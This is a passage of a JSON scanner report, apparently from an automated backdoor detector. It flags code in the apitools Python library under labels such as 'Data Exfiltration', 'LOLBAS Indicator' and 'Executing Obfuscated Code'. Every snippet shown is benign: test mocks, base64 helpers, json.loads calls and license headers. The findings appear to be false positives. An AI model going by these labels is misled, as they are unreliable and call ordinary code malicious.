                      "markdown": "`        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 45,
                  "endLine": 259,
                  "endColumn": 54,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                expected_request=http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 1142,\n                }, 'x' * 1142),\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                expected_request=http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 1142,\n                }, 'x' * 1142),\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                expected_request=http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 1142,\n                }, 'x' * 1142),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 231,
                  "startColumn": 27,
                  "endLine": 231,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        )\n\n    def _MakeSampleRequest(self, url, name):\n        return http_wrapper.Request(url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, '{0} {1}'.format(name, 'x' * (79 - len(name))))\n",
                    "rendered": {
                      "text": "        )\n\n    def _MakeSampleRequest(self, url, name):\n        return http_wrapper.Request(url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, '{0} {1}'.format(name, 'x' * (79 - len(name))))\n",
                      "markdown": "`        )\n\n    def _MakeSampleRequest(self, url, name):\n        return http_wrapper.Request(url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, '{0} {1}'.format(name, 'x' * (79 - len(name))))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 28,
                  "endLine": 177,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419),\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419),\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 38,
                  "endLine": 168,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n",
                    "rendered": {
                      "text": "        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n",
                      "markdown": "`        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 28,
                  "endLine": 118,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419),\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419),\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 38,
                  "endLine": 109,
                  "endColumn": 47,
                  "snippet": {
                    "text": "                                                  retryable_codes=[])\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n",
                    "rendered": {
                      "text": "                                                  retryable_codes=[])\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n",
                      "markdown": "`                                                  retryable_codes=[])\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/list_pager_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 19,
                  "endLine": 176,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n    Known **kwargs:\n      shortstrings: bool, True if all string values should be\n          truncated at 100 characters, since when mocking the contents\n          typically don't matter except for IDs, and IDs are usually\n          less than 100 characters.\n      no_modules: bool, True if the long module name should not be printed with\n",
                    "rendered": {
                      "text": "\n    Known **kwargs:\n      shortstrings: bool, True if all string values should be\n          truncated at 100 characters, since when mocking the contents\n          typically don't matter except for IDs, and IDs are usually\n          less than 100 characters.\n      no_modules: bool, True if the long module name should not be printed with\n",
                      "markdown": "`\n    Known **kwargs:\n      shortstrings: bool, True if all string values should be\n          truncated at 100 characters, since when mocking the contents\n          typically don't matter except for IDs, and IDs are usually\n          less than 100 characters.\n      no_modules: bool, True if the long module name should not be printed with\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 503,
                  "startColumn": 25,
                  "endLine": 503,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n\ndef _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n",
                    "rendered": {
                      "text": "\n\ndef _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n",
                      "markdown": "`\n\ndef _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 6,
                  "endLine": 20,
                  "snippet": {
                    "text": "\n\"\"\"Common code for converting proto to other formats, such as JSON.\"\"\"\n\nimport base64\nimport collections\nimport datetime\nimport json\n\n",
                    "rendered": {
                      "text": "\n\"\"\"Common code for converting proto to other formats, such as JSON.\"\"\"\n\nimport base64\nimport collections\nimport datetime\nimport json\n\n",
                      "markdown": "`\n\"\"\"Common code for converting proto to other formats, such as JSON.\"\"\"\n\nimport base64\nimport collections\nimport datetime\nimport json\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 505,
                  "startColumn": 17,
                  "endLine": 505,
                  "endColumn": 23,
                  "snippet": {
                    "text": "def _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n    except TypeError:\n        result = value\n",
                    "rendered": {
                      "text": "def _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n    except TypeError:\n        result = value\n",
                      "markdown": "`def _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n    except TypeError:\n        result = value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 503,
                  "startColumn": 26,
                  "endLine": 503,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n\ndef _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n",
                    "rendered": {
                      "text": "\n\ndef _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n",
                      "markdown": "`\n\ndef _SafeDecodeBytes(unused_field, value):\n    \"\"\"Decode the urlsafe base64 value into bytes.\"\"\"\n    try:\n        result = base64.urlsafe_b64decode(str(value))\n        complete = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 494,
                  "startColumn": 21,
                  "endLine": 494,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n        else:\n            result = base64.urlsafe_b64encode(value)\n        complete = True\n    except TypeError:\n        result = value\n",
                    "rendered": {
                      "text": "        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n        else:\n            result = base64.urlsafe_b64encode(value)\n        complete = True\n    except TypeError:\n        result = value\n",
                      "markdown": "`        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n        else:\n            result = base64.urlsafe_b64encode(value)\n        complete = True\n    except TypeError:\n        result = value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 492,
                  "startColumn": 22,
                  "endLine": 492,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    \"\"\"Encode the bytes in value as urlsafe base64.\"\"\"\n    try:\n        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n        else:\n            result = base64.urlsafe_b64encode(value)\n        complete = True\n",
                    "rendered": {
                      "text": "    \"\"\"Encode the bytes in value as urlsafe base64.\"\"\"\n    try:\n        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n        else:\n            result = base64.urlsafe_b64encode(value)\n        complete = True\n",
                      "markdown": "`    \"\"\"Encode the bytes in value as urlsafe base64.\"\"\"\n    try:\n        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n        else:\n            result = base64.urlsafe_b64encode(value)\n        complete = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 489,
                  "startColumn": 44,
                  "endLine": 489,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n\ndef _SafeEncodeBytes(field, value):\n    \"\"\"Encode the bytes in value as urlsafe base64.\"\"\"\n    try:\n        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n",
                    "rendered": {
                      "text": "\n\ndef _SafeEncodeBytes(field, value):\n    \"\"\"Encode the bytes in value as urlsafe base64.\"\"\"\n    try:\n        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n",
                      "markdown": "`\n\ndef _SafeEncodeBytes(field, value):\n    \"\"\"Encode the bytes in value as urlsafe base64.\"\"\"\n    try:\n        if field.repeated:\n            result = [base64.urlsafe_b64encode(byte) for byte in value]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 7,
                  "endLine": 19,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n\"\"\"Common code for converting proto to other formats, such as JSON.\"\"\"\n\nimport base64\nimport collections\nimport datetime\nimport json\n",
                    "rendered": {
                      "text": "\n\"\"\"Common code for converting proto to other formats, such as JSON.\"\"\"\n\nimport base64\nimport collections\nimport datetime\nimport json\n",
                      "markdown": "`\n\"\"\"Common code for converting proto to other formats, such as JSON.\"\"\"\n\nimport base64\nimport collections\nimport datetime\nimport json\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 29,
                  "endLine": 123,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\ndef JsonToMessage(message_type, message):\n    \"\"\"Convert the given JSON to a message of type message_type.\"\"\"\n    return _ProtoJsonApiTools.Get().decode_message(message_type, message)\n\n\n# TODO(craigcitro): Do this directly, instead of via JSON.\n",
                    "rendered": {
                      "text": "\ndef JsonToMessage(message_type, message):\n    \"\"\"Convert the given JSON to a message of type message_type.\"\"\"\n    return _ProtoJsonApiTools.Get().decode_message(message_type, message)\n\n\n# TODO(craigcitro): Do this directly, instead of via JSON.\n",
                      "markdown": "`\ndef JsonToMessage(message_type, message):\n    \"\"\"Convert the given JSON to a message of type message_type.\"\"\"\n    return _ProtoJsonApiTools.Get().decode_message(message_type, message)\n\n\n# TODO(craigcitro): Do this directly, instead of via JSON.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 701,
                  "startColumn": 43,
                  "endLine": 701,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\n\ndef _DecodeCustomFieldNames(message_type, encoded_message):\n    field_remappings = _JSON_FIELD_MAPPINGS.get(message_type, {})\n    if field_remappings:\n        decoded_message = json.loads(encoded_message)\n        for python_name, json_name in list(field_remappings.items()):\n",
                    "rendered": {
                      "text": "\n\ndef _DecodeCustomFieldNames(message_type, encoded_message):\n    field_remappings = _JSON_FIELD_MAPPINGS.get(message_type, {})\n    if field_remappings:\n        decoded_message = json.loads(encoded_message)\n        for python_name, json_name in list(field_remappings.items()):\n",
                      "markdown": "`\n\ndef _DecodeCustomFieldNames(message_type, encoded_message):\n    field_remappings = _JSON_FIELD_MAPPINGS.get(message_type, {})\n    if field_remappings:\n        decoded_message = json.loads(encoded_message)\n        for python_name, json_name in list(field_remappings.items()):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 689,
                  "startColumn": 48,
                  "endLine": 689,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n\ndef _EncodeCustomFieldNames(message, encoded_value):\n    field_remappings = list(_JSON_FIELD_MAPPINGS.get(type(message), {})\n                            .items())\n    if field_remappings:\n        decoded_value = json.loads(encoded_value)\n",
                    "rendered": {
                      "text": "\n\ndef _EncodeCustomFieldNames(message, encoded_value):\n    field_remappings = list(_JSON_FIELD_MAPPINGS.get(type(message), {})\n                            .items())\n    if field_remappings:\n        decoded_value = json.loads(encoded_value)\n",
                      "markdown": "`\n\ndef _EncodeCustomFieldNames(message, encoded_value):\n    field_remappings = list(_JSON_FIELD_MAPPINGS.get(type(message), {})\n                            .items())\n    if field_remappings:\n        decoded_value = json.loads(encoded_value)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 661,
                  "startColumn": 35,
                  "endLine": 661,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    field_remappings = mappings.get(type_name, {})\n    if field_remappings:\n        if python_name:\n            return field_remappings.get(python_name)\n        elif json_name:\n            if json_name in list(field_remappings.values()):\n                return [k for k in field_remappings\n",
                    "rendered": {
                      "text": "    field_remappings = mappings.get(type_name, {})\n    if field_remappings:\n        if python_name:\n            return field_remappings.get(python_name)\n        elif json_name:\n            if json_name in list(field_remappings.values()):\n                return [k for k in field_remappings\n",
                      "markdown": "`    field_remappings = mappings.get(type_name, {})\n    if field_remappings:\n        if python_name:\n            return field_remappings.get(python_name)\n        elif json_name:\n            if json_name in list(field_remappings.values()):\n                return [k for k in field_remappings\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 658,
                  "startColumn": 31,
                  "endLine": 658,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        raise exceptions.InvalidDataError(\n            'Must specify either python_name or json_name for %s remapping' % (\n                mapping_type,))\n    field_remappings = mappings.get(type_name, {})\n    if field_remappings:\n        if python_name:\n            return field_remappings.get(python_name)\n",
                    "rendered": {
                      "text": "        raise exceptions.InvalidDataError(\n            'Must specify either python_name or json_name for %s remapping' % (\n                mapping_type,))\n    field_remappings = mappings.get(type_name, {})\n    if field_remappings:\n        if python_name:\n            return field_remappings.get(python_name)\n",
                      "markdown": "`        raise exceptions.InvalidDataError(\n            'Must specify either python_name or json_name for %s remapping' % (\n                mapping_type,))\n    field_remappings = mappings.get(type_name, {})\n    if field_remappings:\n        if python_name:\n            return field_remappings.get(python_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 480,
                  "startColumn": 30,
                  "endLine": 480,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    value_field = pairs_type.field_by_name('value')\n    value_variant = value_field.variant\n    pairs = getattr(message, source)\n    codec = _ProtoJsonApiTools.Get()\n    for pair in pairs:\n        encoded_value = codec.encode_field(value_field, pair.value)\n        result.set_unrecognized_field(pair.key, encoded_value, value_variant)\n",
                    "rendered": {
